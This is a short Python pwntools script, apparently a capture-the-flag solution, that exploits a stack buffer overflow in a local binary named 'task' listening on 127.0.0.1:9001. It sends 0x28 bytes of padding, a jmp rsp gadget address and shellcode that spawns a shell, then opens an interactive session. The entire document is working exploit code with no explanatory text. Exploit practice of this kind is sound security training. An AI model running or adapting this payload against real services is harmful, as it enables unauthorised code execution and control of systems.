#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

JMP_RSP = 0x4011c5

payload = b""
payload += b"A" * 0x28
payload += p64(JMP_RSP)
payload += asm(shellcraft.sh())
p.sendline(payload)

p.readline()

p.interactive()
